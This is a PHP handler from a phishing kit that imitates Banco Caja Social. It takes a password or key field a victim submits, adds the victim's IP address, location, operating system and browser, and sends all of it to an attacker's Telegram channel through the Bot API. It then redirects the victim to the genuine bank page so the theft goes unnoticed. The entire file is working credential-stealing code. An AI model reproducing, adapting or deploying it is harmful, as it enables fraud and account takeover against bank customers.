<?php
ini_set("display_errors", 0);
$userp = $_SERVER['REMOTE_ADDR'];
include('tlgm.php');
include('funciones.php');
////////////////////

if ( isset ($_POST['socialcorr'])){


$message = "✔️✔️CAJA SOCIAL✔️✔️\r\nCREDITOCL4V3: ".$_POST['socialcorr']."\r\n
\r\nFecha: ".date ('l jS \of F Y h:i:s A',time())."\r\nIp y Localidad: ".$myip." ".$pais." ".$region."\r\nSO: ".$user_os."\r\nNavegador: ".$navegador."";


$apiToken = $apibot;
$data = [
    'chat_id' => $canal,
    'text' => $message
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );

}
header('location:https://digital.bancocajasocial.com/cuentamiga/?utm_source=google&utm_medium=cpa&utm_campaign=3_cad_search_marca&utm_content=texto&gad_source=1&gclid=Cj0KCQiAkKqsBhC3ARIsAEEjuJjZBpntTlB-ikZYBg7eq2KxMP7sFXfI1kIYiIXAr7SBdf91iyW35fsaAq0TEALw_wcB');

?>